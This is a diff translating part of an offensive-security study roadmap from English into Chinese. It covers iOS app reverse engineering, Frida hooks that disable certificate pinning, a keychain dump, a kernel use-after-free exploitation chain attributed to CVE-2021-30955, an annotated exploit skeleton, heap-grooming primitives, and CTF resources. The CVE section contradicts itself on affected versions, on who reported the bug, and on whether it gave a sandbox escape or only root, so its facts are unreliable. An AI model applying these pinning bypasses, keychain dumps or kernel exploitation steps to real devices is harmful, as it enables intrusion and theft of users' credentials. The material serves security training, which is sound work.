-| [Frida iOS](https://www.frida.re/docs/ios/) | Docs | 3 hrs | FREE | Official Frida iOS guide |
-| [Project Zero iOS](https://googleprojectzero.blogspot.com/search/label/iOS) | Blog | ongoing | FREE | Read ALL. State of the art iOS security research. |
-| [palera1n jailbreak](https://palera.in/) | Tool | 2 hrs | FREE | Modern iOS jailbreaks for device-side testing |
-| [XNU kernel source](https://github.com/apple-oss-distributions/xnu) | Source | 20+ hrs | FREE | Read this to understand what you're exploiting. |
+| [OWASP MASTG iOS](https://mas.owasp.org/MASTG/iOS/) | 指南 | 8 小时 | 免费 | 全面的 iOS 安全评估 |
+| [Frida iOS](https://www.frida.re/docs/ios/) | 文档 | 3 小时 | 免费 | Frida iOS 官方指南 |
+| [Project Zero iOS](https://googleprojectzero.blogspot.com/search/label/iOS) | 博客 | 持续更新 | 免费 | 全部读完。最前沿的 iOS 安全研究。 |
+| [palera1n 越狱](https://palera.in/) | 工具 | 2 小时 | 免费 | 用于设备端测试的现代 iOS 越狱 |
+| [XNU 内核源码](https://github.com/apple-oss-distributions/xnu) | 源码 | 20+ 小时 | 免费 | 阅读它以理解你在利用什么。 |
 
-### iOS Application Layer
+### iOS 应用层
 
 ```bash
-# Decrypt IPA from jailbroken device:
-# frida-ios-dump: https://github.com/AloneMonkey/frida-ios-dump
+# 从越狱设备解密 IPA：
+# frida-ios-dump：https://github.com/AloneMonkey/frida-ios-dump
 python3 dump.py -H 127.0.0.1 -p 2222 com.target.app
 
-# Inspect binary:
+# 检查二进制：
 otool -l Payload/AppName.app/AppName | grep -A 4 LC_ENCRYPTION_INFO_64
-# cryptid = 0: not encrypted, analyze directly
+# cryptid = 0：未加密，可直接分析
 
-# Security features:
+# 安全特性：
 otool -hv AppName | grep -E "PIE|STACK_CANARIES"
 codesign -d --entitlements - AppName
 
-# Decompile:
-# Ghidra or IDA Pro: open binary -> ARM64 decompilation
+# 反编译：
+# Ghidra 或 IDA Pro：打开二进制 -> ARM64 反编译
 class-dump AppName -H --output headers/
 
-# Dynamic analysis (jailbroken device):
+# 动态分析（越狱设备）：
 frida -U -f com.target.app --no-pause -l hook_ios.js
 ```
 
 ```javascript
-// hook_ios.js -- iOS Objective-C and Swift hooks
+// hook_ios.js——iOS Objective-C 与 Swift 挂钩
 
-// Log all HTTP requests:
+// 记录所有 HTTP 请求：
 var session = ObjC.classes.NSURLSession;
 Interceptor.attach(
     session['- dataTaskWithRequest:completionHandler:'].implementation,
@@ -2926,7 +2926,7 @@ Interceptor.attach(
     }
 );
 
-// Disable certificate pinning:
+// 禁用证书固定：
 var SecTrustEvaluateWithError = Module.findExportByName('Security',
     'SecTrustEvaluateWithError');
 Interceptor.attach(SecTrustEvaluateWithError, {
@@ -2935,15 +2935,15 @@ Interceptor.attach(SecTrustEvaluateWithError, {
 ```
 
 ```bash
-# SSL Pinning Bypass:
+# SSL 证书固定绕过：
 objection -g com.target.app explore
 # ios sslpinning disable
 
-# Keychain Dump:
+# Keychain 导出：
 keychain-dumper -a
 ```
 
-### iOS Kernel Exploitation Methodology
+### iOS 内核利用方法论
 
 <div align="center">
 <table><tr><td>
@@ -2954,75 +2954,75 @@ keychain-dumper -a
 </div>
 
 
-### iOS CVE Walkthrough -- IOKit UAF Exploitation (GAP CLOSED)
+### iOS CVE 走查——IOKit UAF 利用（缺口已补齐）
 
-This section synthesizes the attack pattern from CVE-2021-30955 (iOS 15 sandbox escape, disclosed by Google Project Zero) into a studied walkthrough. The CVE is fully patched. This is for educational analysis of the technique.
+本节将 CVE-2021-30955（iOS 15 沙箱逃逸，由 Google Project Zero 披露）中的攻击模式综合为一份研读式走查。该 CVE 已完全修补。本节仅用于对该技术的教育性分析。
 
 ```
-CVE-2021-30955: IOKit User Client Race Condition
-Affected: iOS 14.x, fixed in iOS 15.2
-Reporter: Saar Amar (MSRC)
-Type: Use-After-Free in IOKit user client
+CVE-2021-30955：IOKit 用户客户端竞争条件
+影响：iOS 14.x，在 iOS 15.2 中修复
+报告者：Saar Amar（MSRC）
+类型：IOKit 用户客户端中的释放后使用
 
-ROOT CAUSE:
-  An IOKit driver's external method allowed a race condition between two threads:
-  Thread A: allocates a kernel object via ExternalMethod selector N
-  Thread B: frees that object via ExternalMethod selector M
-  If Thread B wins the race, Thread A continues using the freed object (UAF).
+根因：
+  某 IOKit 驱动的外部方法允许两个线程之间发生竞争条件：
+  线程 A：通过 ExternalMethod 选择子 N 分配一个内核对象
+  线程 B：通过 ExternalMethod 选择子 M 释放该对象
+  如果线程 B 赢得竞争，线程 A 会继续使用已释放的对象（UAF）。
 
-EXPLOITATION CHAIN (high level):
+利用链（高层）：
 
-1. SETUP: Open the vulnerable IOKit service:
+1. 准备：打开存在漏洞的 IOKit 服务：
    io_connect_t conn;
    IOServiceOpen(service, mach_task_self(), 0, &conn);
 
-2. SPRAY (before triggering bug):
-   Allocate 4096 Mach ports (ipc_port_t, 168 bytes = 0xA8 each).
-   These will reclaim the freed zone slot.
+2. 喷洒（在触发缺陷之前）：
+   分配 4096 个 Mach port（ipc_port_t，每个 168 字节 = 0xA8）。
+   它们将回收已释放的 zone 槽位。
    for (int i = 0; i < 4096; i++)
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
 
-3. TRIGGER RACE:
-   Thread A: IOConnectCallMethod(conn, SELECTOR_ALLOC, ...) -- allocates object
-   Thread B: IOConnectCallMethod(conn, SELECTOR_FREE, ...)  -- frees object
-   Synchronization: use a semaphore to time Thread B between A's alloc and first use.
-   With enough retries (~1000), Thread B wins the race reliably.
+3. 触发竞争：
+   线程 A：IOConnectCallMethod(conn, SELECTOR_ALLOC, ...)——分配对象
+   线程 B：IOConnectCallMethod(conn, SELECTOR_FREE, ...)——释放对象
+   同步：使用信号量在 A 的分配与首次使用之间安排线程 B。
+   经过足够多次重试（约 1000 次），线程 B 能可靠地赢得竞争。
 
-4. TYPE CONFUSION:
-   The freed object (zone slot) is now occupied by one of our ipc_port_t sprays.
-   When the driver later dereferences the stale pointer, it reads ipc_port_t fields
-   as if they were the original driver struct fields.
-   ipc_port_t contains: ip_receiver (a task pointer at a known offset).
+4. 类型混淆：
+   已释放的对象（zone 槽位）现在被我们的某个 ipc_port_t 喷洒对象占据。
+   当驱动稍后解引用过期指针时，它会把 ipc_port_t 的字段
+   当作原始驱动结构体字段来读取。
+   ipc_port_t 包含：ip_receiver（位于已知偏移的 task 指针）。
 
-5. LEAK:
-   The driver's stale dereference exposes ip_receiver (a kernel task pointer).
-   Read this pointer from the return value of the triggering ExternalMethod call.
-   Use the leaked task pointer to calculate: kernel_slide = leaked_task - known_offset.
+5. 泄露：
+   驱动的过期解引用暴露了 ip_receiver（一个内核 task 指针）。
+   从触发 ExternalMethod 调用的返回值中读取该指针。
+   使用泄露的 task 指针计算：kernel_slide = leaked_task - known_offset。
 
-6. FAKE OBJECT:
-   With kernel_slide known: compute address of kernel symbols.
-   Use a write primitive (another IOCTL or the UAF write path) to place
-   a fake ipc_port_t at a controlled location.
-   Set ip_receiver to point to a fake task struct we control.
-   The fake task's bsd_info field points to a fake proc struct.
-   The fake proc's p_ucred field points to our crafted credentials (uid=0).
+6. 伪造对象：
+   已知 kernel_slide 后：计算内核符号的地址。
+   使用写原语（另一个 IOCTL 或 UAF 写路径）将
+   伪造的 ipc_port_t 放置在受控位置。
+   将 ip_receiver 设置为指向我们控制的伪造 task 结构体。
+   伪造 task 的 bsd_info 字段指向伪造的 proc 结构体。
+   伪造 proc 的 p_ucred 字段指向我们构造的凭据（uid=0）。
 
-7. PRIVILEGE ESCALATION:
-   Trigger a MIG call that traverses: port -> task -> bsd_info -> proc -> ucred.
-   The kernel reads our forged ucred (uid=0) and uses it for capability checks.
-   We are now root within the sandbox.
+7. 权限提升：
+   触发一次 MIG 调用，遍历：port -> task -> bsd_info -> proc -> ucred。
+   内核读取我们伪造的 ucred（uid=0），并将其用于能力检查。
+   我们现在在沙箱内是 root。
 
-8. SANDBOX ESCAPE (requires separate bug or entitlement bypass):
-   Root within the sandbox still cannot access /etc/shadow, /data, etc.
-   A separate TCC bypass or SIP bypass is needed for full sandbox escape.
-   CVE-2021-30955 provided root; sandbox escape was chained separately.
+8. 沙箱逃逸（需要单独的缺陷或权限绕过）：
+   沙箱内的 root 仍然无法访问 /etc/shadow、/data 等。
+   完整沙箱逃逸需要单独的 TCC 绕过或 SIP 绕过。
+   CVE-2021-30955 提供了 root；沙箱逃逸是另外串联的。
 ```
 
 ```c
-// File: ios_uaf_skeleton.c
-// Annotated exploitation skeleton based on CVE-2021-30955 pattern.
-// This is EDUCATIONAL SYNTHESIS from public disclosure, not a working exploit.
-// Requires: specific vulnerable iOS version + driver + offsets for your build.
+// 文件：ios_uaf_skeleton.c
+// 基于 CVE-2021-30955 模式的带注释利用骨架。
+// 这是来自公开披露的教育性综合，不是可用的利用。
+// 要求：特定存在漏洞的 iOS 版本 + 驱动 + 适用于你的构建的偏移。
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -3031,7 +3031,7 @@ EXPLOITATION CHAIN (high level):
 #include <pthread.h>
 #include <semaphore.h>
 
-// Step 1: Find and open the vulnerable IOKit service
+// 第 1 步：查找并打开存在漏洞的 IOKit 服务
 io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
     IOServiceMatching("VulnerableIOKitDriver"));
 
@@ -3047,41 +3047,41 @@ if (kr != KERN_SUCCESS) {
     return 1;
 }
 
-// Step 2: Spray Mach ports to reclaim freed zone slot
-// ipc_port_t size on arm64 = 0xA8 bytes = 168 bytes
-// If the vulnerable object is also 0xA8 bytes, they share a zone.
+// 第 2 步：喷洒 Mach port 以回收已释放的 zone 槽位
+// arm64 上 ipc_port_t 大小 = 0xA8 字节 = 168 字节
+// 如果存在漏洞的对象也是 0xA8 字节，它们共享同一个 zone。
 #define SPRAY_COUNT 4096
 mach_port_t ports[SPRAY_COUNT];
 
 for (int i = 0; i < SPRAY_COUNT; i++) {
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
-    // Each allocation gives us an ipc_port_t in the kernel's zone allocator.
-    // With 4096 ports, we dominate the zone for that size class.
+    // 每次分配都会在内核的 zone 分配器中给我们一个 ipc_port_t。
+    // 有 4096 个 port，我们就能主导该大小类的 zone。
 }
 printf("[+] Sprayed %d Mach ports (ipc_port_t objects)\n", SPRAY_COUNT);
 
-// Step 3: Trigger the race condition
-// Thread A allocates the object, Thread B frees it.
-// We use a semaphore to time Thread B during Thread A's alloc-to-use window.
+// 第 3 步：触发竞争条件
+// 线程 A 分配对象，线程 B 释放它。
+// 我们使用信号量在 A 从分配到使用的时间窗口内安排线程 B。
 sem_t race_sem;
 sem_init(&race_sem, 0, 0);
 
-// (In a real exploit: launch Thread B, have it wait on sem, Thread A signals it
-//  between IOCTL_ALLOC and IOCTL_USE, Thread B calls IOCTL_FREE)
-// For a complete implementation: see Ian Beer's Project Zero PoCs on GitHub.
+// （在真实利用中：启动线程 B，让它在信号量上等待，线程 A 在
+//  IOCTL_ALLOC 与 IOCTL_USE 之间发出信号，线程 B 调用 IOCTL_FREE）
+// 完整实现：参见 Ian Beer 在 GitHub 上的 Project Zero PoC。
 
-// Step 4: After UAF -- read the confused ipc_port_t via the driver's stale ptr
-// The driver attempts to read field X from the "original" struct.
-// Field X overlaps with ipc_port_t.ip_receiver (kernel task pointer).
-// This gives us a kernel pointer leak.
+// 第 4 步：UAF 之后——通过驱动的过期指针读取被混淆的 ipc_port_t
+// 驱动尝试从“原始”结构体中读取字段 X。
+// 字段 X 与 ipc_port_t.ip_receiver（内核 task 指针）重叠。
+// 这给了我们一个内核指针泄露。
 
 uint64_t leaked_ptr = 0;
 // kr = IOConnectCallMethod(conn, SELECTOR_READ_STALE, ..., &leaked_ptr, ...);
 // printf("[+] Leaked kernel pointer: 0x%llx\n", leaked_ptr);
 
-// Step 5: Calculate kernel slide from leaked pointer
+// 第 5 步：从泄露的指针计算 kernel slide
 // kernel_slide = leaked_ptr - known_symbol_static_offset;
-// With slide known: all kernel symbols computable.
+// 已知 slide：所有内核符号都可计算。
 
 printf("[*] For a complete CVE-specific walkthrough:\n");
 printf("    Read: https://googleprojectzero.blogspot.com/search/label/iOS\n");
@@ -3092,80 +3092,80 @@ IOServiceClose(conn);
 return 0;
 ```
 
-### iOS Grooming Primitives Reference
+### iOS 堆布局原语参考
 
 ```c
-// GROOMING PRIMITIVES FOR iOS (equivalent to msg_msg on Linux):
+// iOS 的堆布局原语（相当于 Linux 上的 msg_msg）：
 
-// 1. IOSurface (best -- controllable size, available without entitlements):
+// 1. IOSurface（最佳——大小可控，无需权限即可使用）：
 IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
     @"IOSurfaceWidth":  @1,
     @"IOSurfaceHeight": @1,
     @"IOSurfaceBytesPerElement": @4,
     @"IOSurfacePixelFormat": @(kCVPixelFormatType_32BGRA),
-    // Key: set IOSurfaceAllocSize to control exact allocation size:
-    @"IOSurfaceAllocSize": @(168)   // target size: must match vulnerable object
+    // 关键：将 IOSurfaceAllocSize 设为控制确切的分配大小：
+    @"IOSurfaceAllocSize": @(168)   // 目标大小：必须与存在漏洞的对象匹配
 });
 
-// 2. Mach port spray (ipc_port_t = 168 bytes on arm64):
+// 2. Mach port 喷洒（arm64 上 ipc_port_t = 168 字节）：
 mach_port_t port;
 for (int i = 0; i < 4096; i++)
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
 
-// 3. Pipe buffers (pipe_buffer structs: multiple size classes):
+// 3. 管道缓冲区（pipe_buffer 结构体：多个大小类）：
 int pipefd[2];
 pipe(pipefd);
-// First write allocates pipe_buffer in kernel: size = next power of 2 >= write_size
+// 首次写入会在内核中分配 pipe_buffer：大小 = >= write_size 的下一个 2 的幂
 write(pipefd[1], spray_data, target_size);
 
-// 4. VM map entries (vm_map_entry_t, size varies):
+// 4. VM map 条目（vm_map_entry_t，大小可变）：
 void *addr;
 vm_allocate(mach_task_self(), (vm_address_t*)&addr, target_size, VM_FLAGS_ANYWHERE);
 ```
 
 ---
 
-## CTF PROGRESSION AND LAB RESOURCES
+## CTF 进阶与实验资源
 
-### CTF Platforms for Phase 3
+### 阶段 3 的 CTF 平台
 
-| Platform | Focus | Cost | Notes |
+| 平台 | 重点 | 成本 | 备注 |
 |---|---|---|---|
-| [pwn.college](https://pwn.college) | Binary exploitation, kernel | FREE | Best structured course. Mandatory. |
-| [HackTheBox](https://hackthebox.com) | Full spectrum | ~$14/month | Good variety of binary and kernel challenges |
-| [pwnable.kr](https://pwnable.kr) | Binary exploitation | FREE | Korean CTF, excellent |
-| [ropemporium](https://ropemporium.com) | ROP chains | FREE | Do all 8 challenges |
-| [how2heap](https://github.com/shellphish/how2heap) | Heap exploitation | FREE | Working examples of every technique |
-| [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | Windows kernel | FREE | THE Windows kernel training target |
-| [VulnHub](https://www.vulnhub.com) | Download + local | FREE | Free, offline |
+| [pwn.college](https://pwn.college) | 二进制漏洞利用、内核 | 免费 | 结构最好的课程。必修。 |
+| [HackTheBox](https://hackthebox.com) | 全领域 | 约 $14/月 | 二进制与内核挑战种类丰富 |
+| [pwnable.kr](https://pwnable.kr) | 二进制漏洞利用 | 免费 | 韩国 CTF，非常优秀 |
+| [ropemporium](https://ropemporium.com) | ROP 链 | 免费 | 完成全部 8 个挑战 |
+| [how2heap](https://github.com/shellphish/how2heap) | 堆利用 | 免费 | 每种技术的可用示例 |
+| [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | Windows 内核 | 免费 | Windows 内核训练的标准靶场 |
+| [VulnHub](https://www.vulnhub.com) | 下载 + 本地 | 免费 | 免费、离线 |
 
-### Phase 2 to Phase 3 Bridge
+### 从阶段 2 到阶段 3 的桥梁
 
-**Do this before starting Phase 3:**
+**在开始阶段 3 之前先做这些：**
 
-Read these chapters from Hacking: The Art of Exploitation (Erickson):
-- Chapter 2: Programming (C fundamentals, pointers, memory)
-- Chapter 3: Exploitation (stack overflow mechanics)
+阅读《Hacking: The Art of Exploitation》（Erickson）中的以下章节：
+- 第 2 章：编程（C 基础、指针、内存）
+- 第 3 章：漏洞利用（栈溢出机制）
 
-This is mandatory. Do not skip it. These chapters are why Phase 3 makes sense.
+这是强制性的。不要跳过。这些章节正是阶段 3 能够成立的原因。
 
-**Understand these concepts before Day 1 of Phase 3:**
-- What a stack frame is and why it exists
-- What saved RBP and saved RIP are, and where they live
-- What a calling convention means and which registers are used
-- How malloc and free work at a basic level
-- What a system call is and how arguments are passed
+**在阶段 3 第 1 天之前理解这些概念：**
+- 什么是栈帧，以及它为何存在
+- 保存的 RBP 和保存的 RIP 是什么，它们位于何处
+- 调用约定意味着什么，使用哪些寄存器
+- malloc 和 free 在基本层面上如何工作
+- 什么是系统调用，参数如何传递
 
-> The gap between Phase 2 and Phase 3 is where most people quit. They encounter binary exploitation without the stack foundation and stop. The bridge above prevents that.
+> 阶段 2 与阶段 3 之间的鸿沟正是大多数人放弃之处。他们在没有栈基础的情况下接触二进制漏洞利用，然后停下。上面的桥梁可以防止这种情况。
 
 ---
 
-## FINAL NOTES -- THE 0.0001% STANDARD
+## 最后说明——0.0001% 的标准
 
-Phase 3 is not a checklist. It is a foundation. Every technique here -- ROP chains, heap grooming, kernel exploitation, eBPF rootkits, PAC bypass -- exists as a building block for Phase 4 where you write the tools, find the 0-days, and build the implants.
+阶段 3 不是清单。它是基础。这里的每项技术——ROP 链、堆布局、内核利用、eBPF 后门、PAC 绕过——都是阶段 4 的构建块，在那里你将编写工具、寻找 0-day 并构建植入体。
 
-The milestones require written analysis, not just working shells, for one reason: a shell you got without understanding is a shell you cannot reproduce, adapt, or defend against. The understanding is the deliverable.
+里程碑要求书面分析而不只是可用的 shell，原因只有一个：你在不理解的情况下得到的 shell，是你无法复现、改编或防御的 shell。理解本身才是交付物。
 
-Every technique in this document was discovered by someone who did not stop. That is the whole architecture.
+本文档中的每项技术都是由某个没有停下的人发现的。这就是整个架构。
 
 ---
